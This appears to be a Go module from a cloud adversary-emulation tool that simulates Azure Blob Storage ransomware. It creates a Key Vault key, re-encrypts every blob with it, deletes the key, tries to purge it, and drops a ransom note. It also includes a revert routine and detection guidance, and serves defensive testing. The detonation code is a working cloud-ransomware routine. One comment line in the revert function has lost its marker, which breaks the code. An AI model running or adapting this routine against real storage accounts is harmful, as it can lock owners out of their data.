package azure

import (
	"bytes"
	"context"
	_ "embed"
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/runtime"
	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/keyvault/armkeyvault"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"
	"github.com/Azure/azure-sdk-for-go/sdk/security/keyvault/azkeys"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/blob"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

// Key and encryption scope names
const KeyName = "ransom-encryption-key"
const EncryptionScopeName = "ransom-encryption-scope"

// Ransom note
const RansomContainerName = "your-files-encrypted"
const RansomNoteFilename = "FILES-ENCRYPTED.txt"
const RansomNoteContents = "Your data has been encrypted with a Key Vault key that has been deleted. To negotiate with us for the decryption key, contact evil@hackerz.io. In 7 days, if we don't hear from you, the key will be permanently purged and your data will be unrecoverable."

const CodeBlock = "```"

// Helper functions for creating Azure clients with consistent options
func getVaultsClient(azure *providers.AzureProvider) (*armkeyvault.VaultsClient, error) {
	return armkeyvault.NewVaultsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func getManagementKeysClient(azure *providers.AzureProvider) (*armkeyvault.KeysClient, error) {
	return armkeyvault.NewKeysClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func getDataPlaneKeysClient(azure *providers.AzureProvider, keyVaultName string) (*azkeys.Client, error) {
	vaultURL := fmt.Sprintf("https://%s.vault.azure.net/", keyVaultName)
	return azkeys.NewClient(vaultURL, azure.GetCredentials(), &azkeys.ClientOptions{
		ClientOptions: azure.ClientOptions.ClientOptions,
	})
}

func getEncryptionScopesClient(azure *providers.AzureProvider) (*armstorage.EncryptionScopesClient, error) {
	return armstorage.NewEncryptionScopesClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-client-side-encryption",
		FriendlyName: "Azure Blob Storage ransomware through Key Vault encryption scope",
		Description: `
Simulates Azure Blob Storage ransomware activity that encrypts files using an encryption scope backed by a customer-managed Key Vault key, then deletes the key to render the data inaccessible.

Warm-up:

- Create an Azure Storage Account with a system-assigned managed identity
- Grant the storage account the "Key Vault Crypto Service Encryption User" role on the resource group
- Create multiple storage containers in the account
- Create a number of blobs in the containers with random content and file extensions

Detonation:

- Create a new Azure Key Vault with 7-day purge protection (or restore from soft-delete if it already exists)
- Create an RSA 2048 key in the Key Vault
- Create an encryption scope on the storage account using the Key Vault key
- Download all blobs and re-upload them using the new encryption scope
- Soft-delete the Key Vault key
- Attempt to purge the key (fails due to purge protection, but logged)

References:

- https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/
`,
		Detection: `
You can detect this ransomware activity by monitoring for:

1. **Key Vault creation and key operations**: Monitor Azure Activity logs for Key Vault creation and key deletion events.
2. **Encryption scope creation**: Look for creation of new encryption scopes on storage accounts.
3. **Blob re-encryption patterns**: Identify high volumes of GetBlob followed by PutBlob operations.

Sample Azure Activity log event for Key Vault key deletion:

` + CodeBlock + `json
{
  "operationName": "Microsoft.KeyVault/vaults/keys/delete/action",
  "category": "Administrative",
  "resultType": "Success",
  "properties": {
    "entity": "/subscriptions/<subscription-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>/keys/<key-name>"
  }
}
` + CodeBlock + `

Sample event for encryption scope creation:

` + CodeBlock + `json
{
  "operationName": "Microsoft.Storage/storageAccounts/encryptionScopes/write",
  "category": "Administrative",
  "resultType": "Success"
}
` + CodeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	resourceGroup := params["resource_group_name"]
	tenantID := params["tenant_id"]
	keyVaultName := params["key_vault_name"]
	serviceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()

	log.Println("Simulating a ransomware attack on storage account " + storageAccount)

	// Step 1: Create or restore Key Vault
	_, err := createOrRestoreKeyVault(azureConfig, resourceGroup, tenantID, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create/restore key vault: %w", err)
	}

	// Step 2: Create RSA key in Key Vault
	keyID, err := createKeyVaultKey(azureConfig, resourceGroup, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create key vault key: %w", err)
	}
	log.Printf("Created Key Vault key: %s", keyID)

	// Step 3: Create or enable encryption scope
	if err := createOrEnableEncryptionScope(azureConfig, resourceGroup, storageAccount, keyVaultName); err != nil {
		return fmt.Errorf("failed to create/enable encryption scope: %w", err)
	}

	// Step 4: Re-encrypt all blobs with the new encryption scope
	blobClient, err := utils.GetAzureBlobClient(serviceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	if err := encryptAllBlobsWithScope(blobClient); err != nil {
		return fmt.Errorf("failed to encrypt blobs with encryption scope: %w", err)
	}

	// Step 5: Soft-delete the Key Vault key
	if err := deleteKeyVaultKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to delete key vault key: %w", err)
	}

	// Step 6: Attempt to purge the key (will fail due to purge protection)
	if err := attemptPurgeKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to attempt key purge: %w", err)
	}

	// Step 7: Upload ransom note
	log.Println("Uploading ransom note...")
	if err := utils.UploadBlob(blobClient, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note: %w", err)
	}

	log.Println("Technique execution completed - blobs are now encrypted with a deleted key")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	resourceGroup := params["resource_group_name"]
	keyVaultName := params["key_vault_name"]
	serviceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()

	blobClient, err := utils.GetAzureBlobClient(serviceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	Step 1: Delete ransom note and container
	log.Println("Deleting ransom note and container...")
	if err := deleteRansomNote(blobClient); err != nil {
		return fmt.Errorf("failed to delete ransom note: %w", err)
	}

	// Step 2: Recover the deleted key
	log.Println("Recovering deleted Key Vault key...")
	if err := recoverKeyVaultKey(azureConfig, keyVaultName); err != nil {
		return fmt.Errorf("failed to recover key vault key: %w", err)
	}

	// Step 3: Download all blobs using the encryption scope (auto-decrypts) and re-upload with default encryption
	log.Println("Decrypting all blobs...")
	if err := decryptAllBlobs(blobClient); err != nil {
		return fmt.Errorf("failed to decrypt blobs: %w", err)
	}

	// Step 4: Delete the encryption scope
	log.Println("Disabling encryption scope...")
	if err := deleteEncryptionScope(azureConfig, resourceGroup, storageAccount); err != nil {
		return fmt.Errorf("failed to delete encryption scope: %w", err)
	}

	// Step 5: Soft-delete the Key Vault
	log.Println("Soft-deleting Key Vault...")
	if err := deleteKeyVault(azureConfig, resourceGroup, keyVaultName); err != nil {
		return fmt.Errorf("failed to delete key vault: %w", err)
	}

	log.Println("Cleanup completed")
	return nil
}

func createOrRestoreKeyVault(azure *providers.AzureProvider, resourceGroup, tenantID, keyVaultName string) (string, error) {
	const location = "West US"

	vaultsClient, err := getVaultsClient(azure)
	if err != nil {
		return "", fmt.Errorf("failed to create vaults client: %w", err)
	}

	ctx := context.Background()

	// Check if this specific key vault exists in soft-deleted state
	var createMode *armkeyvault.CreateMode
	_, err = vaultsClient.GetDeleted(ctx, keyVaultName, location, nil)
	if err == nil {
		log.Printf("Found soft-deleted Key Vault: %s, recovering...", keyVaultName)
		createMode = to.Ptr(armkeyvault.CreateModeRecover)
	} else {
		log.Printf("Creating new Key Vault: %s", keyVaultName)
		createMode = to.Ptr(armkeyvault.CreateModeDefault)
	}

	poller, err := vaultsClient.BeginCreateOrUpdate(ctx, resourceGroup, keyVaultName, armkeyvault.VaultCreateOrUpdateParameters{
		Location: to.Ptr(location),
		Properties: &armkeyvault.VaultProperties{
			TenantID:                  to.Ptr(tenantID),
			SKU:                       &armkeyvault.SKU{Family: to.Ptr(armkeyvault.SKUFamilyA), Name: to.Ptr(armkeyvault.SKUNameStandard)},
			CreateMode:                createMode,
			EnableSoftDelete:          to.Ptr(true),
			SoftDeleteRetentionInDays: to.Ptr(int32(7)),
			EnablePurgeProtection:     to.Ptr(true),
			EnableRbacAuthorization:   to.Ptr(true),
			AccessPolicies:            []*armkeyvault.AccessPolicyEntry{},
		},
	}, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create/recover key vault: %w", err)
	}

	result, err := poller.PollUntilDone(ctx, &runtime.PollUntilDoneOptions{Frequency: 2 * time.Second})
	if err != nil {
		return "", fmt.Errorf("failed to poll key vault operation: %w", err)
	}

	log.Printf("Key Vault ready: %s", *result.Properties.VaultURI)
	return *result.Properties.VaultURI, nil
}

func createKeyVaultKey(azure *providers.AzureProvider, resourceGroup, keyVaultName string) (string, error) {
	keysClient, err := getManagementKeysClient(azure)
	if err != nil {
		return "", fmt.Errorf("failed to create keys client: %w", err)
	}

	ctx := context.Background()

	log.Printf("Creating RSA 2048 key in Key Vault: %s", keyVaultName)
	result, err := keysClient.CreateIfNotExist(ctx, resourceGroup, keyVaultName, KeyName, armkeyvault.KeyCreateParameters{
		Properties: &armkeyvault.KeyProperties{
			Kty:     to.Ptr(armkeyvault.JSONWebKeyTypeRSA),
			KeySize: to.Ptr(int32(2048)),
		},
	}, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create key: %w", err)
	}

	return *result.Properties.KeyURIWithVersion, nil
}

func createOrEnableEncryptionScope(azure *providers.AzureProvider, resourceGroup, storageAccount, keyVaultName string) error {
	scopesClient, err := getEncryptionScopesClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create encryption scopes client: %w", err)
	}

	// Get the key URI
	keysClient, err := getManagementKeysClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create keys client: %w", err)
	}

	ctx := context.Background()

	key, err := keysClient.Get(ctx, resourceGroup, keyVaultName, KeyName, nil)
	if err != nil {
		return fmt.Errorf("failed to get key: %w", err)
	}

	keyURI := *key.Properties.KeyURI

	// Check if encryption scope already exists
	existingScope, err := scopesClient.Get(ctx, resourceGroup, storageAccount, EncryptionScopeName, nil)
	if err == nil && existingScope.Name != nil {
		log.Printf("Encryption scope %s already exists, enabling with key: %s", EncryptionScopeName, keyURI)
		_, err = scopesClient.Patch(ctx, resourceGroup, storageAccount, EncryptionScopeName, armstorage.EncryptionScope{
			EncryptionScopeProperties: &armstorage.EncryptionScopeProperties{
				Source: to.Ptr(armstorage.EncryptionScopeSourceMicrosoftKeyVault),
				KeyVaultProperties: &armstorage.EncryptionScopeKeyVaultProperties{
					KeyURI: to.Ptr(keyURI),
				},
				State: to.Ptr(armstorage.EncryptionScopeStateEnabled),
			},
		}, nil)
		if err != nil {
			return fmt.Errorf("failed to enable encryption scope: %w", err)
		}
		log.Printf("Enabled encryption scope: %s", EncryptionScopeName)
		return nil
	}

	// Encryption scope doesn't exist, create it
	log.Printf("Creating encryption scope: %s with key: %s", EncryptionScopeName, keyURI)
	_, err = scopesClient.Put(ctx, resourceGroup, storageAccount, EncryptionScopeName, armstorage.EncryptionScope{
		EncryptionScopeProperties: &armstorage.EncryptionScopeProperties{
			Source: to.Ptr(armstorage.EncryptionScopeSourceMicrosoftKeyVault),
			KeyVaultProperties: &armstorage.EncryptionScopeKeyVaultProperties{
				KeyURI: to.Ptr(keyURI),
			},
			State: to.Ptr(armstorage.EncryptionScopeStateEnabled),
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to create encryption scope: %w", err)
	}

	log.Printf("Created encryption scope: %s", EncryptionScopeName)
	return nil
}

func encryptAllBlobsWithScope(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	totalBlobs := 0
	for _, versionMap := range blobMap {
		totalBlobs += len(versionMap)
	}

	log.Printf("Found %d blobs to encrypt across %d containers", totalBlobs, len(blobMap))
	log.Printf("Re-encrypting all blobs with encryption scope: %s", EncryptionScopeName)

	cpkScopeInfo := &blob.CPKScopeInfo{
		EncryptionScope: to.Ptr(EncryptionScopeName),
	}

	for containerName, versionMap := range blobMap {
		log.Printf("Processing container: %s", containerName)
		for blobName := range versionMap {
			// Download blob
			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, nil)
			if err != nil {
				return fmt.Errorf("unable to download blob %s from container %s: %w", blobName, containerName, err)
			}

			blobContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read blob %s content: %w", blobName, err)
			}

			// Upload with encryption scope
			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(blobContent), &azblob.UploadStreamOptions{
				CPKScopeInfo: cpkScopeInfo,
			})
			if err != nil {
				return fmt.Errorf("unable to upload encrypted blob %s: %w", blobName, err)
			}

			log.Printf("Re-encrypted blob: %s", blobName)
		}
	}

	log.Println("Successfully encrypted all blobs with encryption scope")
	return nil
}

func deleteKeyVaultKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	ctx := context.Background()

	log.Printf("Soft-deleting key: %s from vault: %s", KeyName, keyVaultName)
	_, err = keysClient.DeleteKey(ctx, KeyName, nil)
	if err != nil {
		return fmt.Errorf("failed to delete key: %w", err)
	}

	log.Printf("Successfully soft-deleted key: %s", KeyName)
	return nil
}

func attemptPurgeKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	ctx := context.Background()

	log.Printf("Attempting to purge deleted key: %s from vault: %s", KeyName, keyVaultName)
	_, err = keysClient.PurgeDeletedKey(ctx, KeyName, nil)
	if err != nil {
		log.Printf("Key purge failed as expected (purge protection enabled)")
		return nil
	}

	log.Printf("Successfully purged key: %s. This is unexpected as purge protection should be enabled", KeyName)
	return nil
}

func recoverKeyVaultKey(azure *providers.AzureProvider, keyVaultName string) error {
	keysClient, err := getDataPlaneKeysClient(azure, keyVaultName)
	if err != nil {
		return fmt.Errorf("failed to create data plane keys client: %w", err)
	}

	ctx := context.Background()

	log.Printf("Recovering deleted key: %s in vault: %s", KeyName, keyVaultName)

	// Recover the soft-deleted key
	_, err = keysClient.RecoverDeletedKey(ctx, KeyName, nil)
	if err != nil {
		return fmt.Errorf("failed to recover key: %w", err)
	}

	log.Printf("Successfully recovered key: %s", KeyName)
	return nil
}

func decryptAllBlobs(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	totalBlobs := 0
	for _, versionMap := range blobMap {
		totalBlobs += len(versionMap)
	}

	log.Printf("Found %d blobs to decrypt across %d containers", totalBlobs, len(blobMap))

	for containerName, versionMap := range blobMap {
		log.Printf("Processing container: %s", containerName)
		for blobName := range versionMap {
			// Download blob (server-side decryption happens automatically with encryption scope)
			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, nil)
			if err != nil {
				return fmt.Errorf("unable to download blob %s from container %s: %w", blobName, containerName, err)
			}

			blobContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read blob %s content: %w", blobName, err)
			}

			// Upload without encryption scope (uses default Microsoft-managed encryption)
			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(blobContent), nil)
			if err != nil {
				return fmt.Errorf("unable to upload decrypted blob %s: %w", blobName, err)
			}

			log.Printf("Decrypted and uploaded blob: %s", blobName)
		}
	}

	log.Println("Successfully decrypted all blobs")
	return nil
}

func deleteEncryptionScope(azure *providers.AzureProvider, resourceGroup, storageAccount string) error {
	scopesClient, err := getEncryptionScopesClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create encryption scopes client: %w", err)
	}

	ctx := context.Background()

	// Disable the encryption scope first (required before deletion)
	log.Printf("Disabling encryption scope: %s", EncryptionScopeName)
	_, err = scopesClient.Patch(ctx, resourceGroup, storageAccount, EncryptionScopeName, armstorage.EncryptionScope{
		EncryptionScopeProperties: &armstorage.EncryptionScopeProperties{
			State: to.Ptr(armstorage.EncryptionScopeStateDisabled),
		},
	}, nil)
	if err != nil {
		return fmt.Errorf("failed to disable encryption scope: %w", err)
	}

	log.Printf("Disabled encryption scope: %s (encryption scopes cannot be fully deleted, only disabled)", EncryptionScopeName)
	return nil
}

func deleteKeyVault(azure *providers.AzureProvider, resourceGroup, keyVaultName string) error {
	vaultsClient, err := getVaultsClient(azure)
	if err != nil {
		return fmt.Errorf("failed to create vaults client: %w", err)
	}

	ctx := context.Background()

	log.Printf("Soft-deleting Key Vault: %s", keyVaultName)
	_, err = vaultsClient.Delete(ctx, resourceGroup, keyVaultName, nil)
	if err != nil {
		return fmt.Errorf("failed to delete key vault: %w", err)
	}

	log.Printf("Successfully soft-deleted Key Vault: %s", keyVaultName)
	return nil
}

func deleteRansomNote(client *azblob.Client) error {
	ctx := context.Background()

	_, err := client.DeleteBlob(ctx, RansomContainerName, RansomNoteFilename, nil)
	if err != nil {
		return fmt.Errorf("failed to delete ransom note blob: %w", err)
	}
	log.Printf("Deleted ransom note: %s", RansomNoteFilename)

	_, err = client.DeleteContainer(ctx, RansomContainerName, nil)
	if err != nil {
		return fmt.Errorf("failed to delete ransom container: %w", err)
	}
	log.Printf("Deleted ransom container: %s", RansomContainerName)

	return nil
}
